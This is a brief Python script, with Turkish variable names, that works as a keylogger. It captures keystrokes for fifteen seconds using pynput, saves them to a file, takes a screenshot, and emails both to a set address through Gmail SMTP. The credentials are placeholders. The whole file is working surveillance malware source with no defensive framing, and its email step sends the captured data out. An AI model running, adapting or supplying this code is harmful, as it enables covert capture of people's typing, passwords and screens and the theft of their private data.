import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import pynput.keyboard
import pyautogui

toplama = ""

def emir(harfler):
    global toplama
    try:
        if isinstance(harfler, pynput.keyboard.Key):
            if harfler == pynput.keyboard.Key.space:
                toplama += " "
            elif harfler == pynput.keyboard.Key.backspace:
                toplama = toplama[:-1]
        else:
            toplama += harfler.char
    except AttributeError:
        
        pass


dinleme = pynput.keyboard.Listener(on_press=emir)
dinleme.start()


time.sleep(15)
dinleme.stop()


with open("klavye.txt", "w", encoding="utf-8") as dosya:
    dosya.write(toplama)


smtp_server = 'smtp.gmail.com'
port = 587
sender_email = 'Gondericiposta@gmail.com'
password = 'sifre'
recipient_email = 'Alıcıposta@gmail.com'


message = MIMEMultipart()
message['Subject'] = 'Test E-Postası'
message['From'] = sender_email
message['To'] = recipient_email


text = MIMEText(toplama)
message.attach(text)


screenshot = pyautogui.screenshot()
screenshot_path = "screenshot.png"
screenshot.save(screenshot_path)

with open(screenshot_path, "rb") as image_file:
    image = MIMEImage(image_file.read())
    message.attach(image)


try:
    with smtplib.SMTP(smtp_server, port) as server:
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, recipient_email, message.as_string())
        print("Mail başarılı bir şekilde gönderildi.")
except smtplib.SMTPAuthenticationError:
    print('Hata: Kimlik doğrulama başarısız oldu.')
except Exception as e:
    print(f'Hata: {e}')
